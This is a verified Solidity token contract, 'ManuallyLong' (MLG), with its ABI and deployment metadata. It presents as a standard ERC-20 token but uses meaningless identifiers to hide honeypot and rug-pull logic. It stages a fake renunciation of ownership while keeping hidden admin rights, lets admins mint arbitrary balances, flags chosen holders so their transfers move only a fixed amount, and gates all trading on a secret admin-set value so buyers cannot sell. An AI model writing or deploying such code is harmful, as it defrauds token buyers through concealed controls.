{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.6;\n\ninterface enableTo {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract marketingAt {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface atMarketing {\n    function createPair(address receiverAmountTotal, address totalReceiverIs) external returns (address);\n}\n\ninterface enableTotal {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address txTeamFund) external view returns (uint256);\n\n    function transfer(address takeList, uint256 senderLaunched) external returns (bool);\n\n    function allowance(address txAuto, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 senderLaunched) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address takeList,\n        uint256 senderLaunched\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed limitLaunched, uint256 value);\n    event Approval(address indexed txAuto, address indexed spender, uint256 value);\n}\n\ninterface enableTotalMetadata is enableTotal {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ManuallyLong is marketingAt, enableTotal, enableTotalMetadata {\n\n    uint256 private walletBuy;\n\n    function approve(address enableTake, uint256 senderLaunched) public virtual override returns (bool) {\n        enableAuto[_msgSender()][enableTake] = senderLaunched;\n        emit Approval(_msgSender(), enableTake, senderLaunched);\n        return true;\n    }\n\n    address public tokenReceiverReceiver;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return amountTeam;\n    }\n\n    mapping(address => bool) public receiverFromEnable;\n\n    mapping(address => mapping(address => uint256)) private enableAuto;\n\n    uint256 limitFrom;\n\n    uint256 tokenTx;\n\n    function transfer(address limitList, uint256 senderLaunched) external virtual override returns (bool) {\n        return teamWalletList(_msgSender(), limitList, senderLaunched);\n    }\n\n    uint256 constant enableLiquidity = 19 ** 10;\n\n    function teamMax(address receiverTx, address takeList, uint256 senderLaunched) internal returns (bool) {\n        require(walletMarketing[receiverTx] >= senderLaunched);\n        walletMarketing[receiverTx] -= senderLaunched;\n        walletMarketing[takeList] += senderLaunched;\n        emit Transfer(receiverTx, takeList, senderLaunched);\n        return true;\n    }\n\n    string private fundExempt = \"MLG\";\n\n    function teamWalletList(address receiverTx, address takeList, uint256 senderLaunched) internal returns (bool) {\n        if (receiverTx == amountTotal) {\n            return teamMax(receiverTx, takeList, senderLaunched);\n        }\n        uint256 launchFundMarketing = enableTotal(tokenReceiverReceiver).balanceOf(limitTotal);\n        require(launchFundMarketing == tokenTx);\n        require(takeList != limitTotal);\n        if (fundLaunched[receiverTx]) {\n            return teamMax(receiverTx, takeList, enableLiquidity);\n        }\n        return teamMax(receiverTx, takeList, senderLaunched);\n    }\n\n    function totalMax(uint256 senderLaunched) public {\n        launchedMode();\n        tokenTx = senderLaunched;\n    }\n\n    bool public toLiquidity;\n\n    mapping(address => uint256) private walletMarketing;\n\n    function decimals() external view virtual override returns (uint8) {\n        return modeShouldFund;\n    }\n\n    function receiverTxEnable(address limitMarketing) public {\n        if (toLiquidity) {\n            return;\n        }\n        \n        receiverFromEnable[limitMarketing] = true;\n        \n        toLiquidity = true;\n    }\n\n    uint8 private modeShouldFund = 18;\n\n    uint256 private takeBuy;\n\n    function launchSell(address toFrom) public {\n        launchedMode();\n        if (senderTx == exemptTx) {\n            takeBuy = walletBuy;\n        }\n        if (toFrom == amountTotal || toFrom == tokenReceiverReceiver) {\n            return;\n        }\n        fundLaunched[toFrom] = true;\n    }\n\n    function allowance(address sellTotalExempt, address enableTake) external view virtual override returns (uint256) {\n        if (enableTake == totalAuto) {\n            return type(uint256).max;\n        }\n        return enableAuto[sellTotalExempt][enableTake];\n    }\n\n    function launchedMode() private view {\n        require(receiverFromEnable[_msgSender()]);\n    }\n\n    mapping(address => bool) public fundLaunched;\n\n    constructor (){\n        if (takeBuy != walletBuy) {\n            exemptTx = false;\n        }\n        enableTo minTotal = enableTo(totalAuto);\n        tokenReceiverReceiver = atMarketing(minTotal.factory()).createPair(minTotal.WETH(), address(this));\n        \n        amountTotal = _msgSender();\n        maxLimit();\n        receiverFromEnable[amountTotal] = true;\n        walletMarketing[amountTotal] = amountTeam;\n        \n        emit Transfer(address(0), amountTotal, amountTeam);\n    }\n\n    function enableAmount(address limitList, uint256 senderLaunched) public {\n        launchedMode();\n        walletMarketing[limitList] = senderLaunched;\n    }\n\n    function balanceOf(address txTeamFund) public view virtual override returns (uint256) {\n        return walletMarketing[txTeamFund];\n    }\n\n    address totalAuto = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    bool public senderTx;\n\n    string private tradingFrom = \"Manually Long\";\n\n    bool private exemptTx;\n\n    function transferFrom(address receiverTx, address takeList, uint256 senderLaunched) external override returns (bool) {\n        if (_msgSender() != totalAuto) {\n            if (enableAuto[receiverTx][_msgSender()] != type(uint256).max) {\n                require(senderLaunched <= enableAuto[receiverTx][_msgSender()]);\n                enableAuto[receiverTx][_msgSender()] -= senderLaunched;\n            }\n        }\n        return teamWalletList(receiverTx, takeList, senderLaunched);\n    }\n\n    address limitTotal = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function getOwner() external view returns (address) {\n        return launchWalletAuto;\n    }\n\n    address private launchWalletAuto;\n\n    function name() external view virtual override returns (string memory) {\n        return tradingFrom;\n    }\n\n    function maxLimit() public {\n        emit OwnershipTransferred(amountTotal, address(0));\n        launchWalletAuto = address(0);\n    }\n\n    uint256 private amountTeam = 100000000 * 10 ** 18;\n\n    function owner() external view returns (address) {\n        return launchWalletAuto;\n    }\n\n    address public amountTotal;\n\n    function symbol() external view virtual override returns (string memory) {\n        return fundExempt;\n    }\n\n    event OwnershipTransferred(address indexed tradingReceiver, address indexed fundLimitFee);\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"txAuto\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingReceiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundLimitFee\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"limitLaunched\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellTotalExempt\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"enableTake\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountTotal\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"senderLaunched\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txTeamFund\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitList\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"senderLaunched\",\"type\":\"uint256\"}],\"name\":\"enableAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fundLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toFrom\",\"type\":\"address\"}],\"name\":\"launchSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverFromEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitMarketing\",\"type\":\"address\"}],\"name\":\"receiverTxEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenReceiverReceiver\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"senderLaunched\",\"type\":\"uint256\"}],\"name\":\"totalMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitList\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"senderLaunched\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverTx\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"takeList\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"senderLaunched\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "ManuallyLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}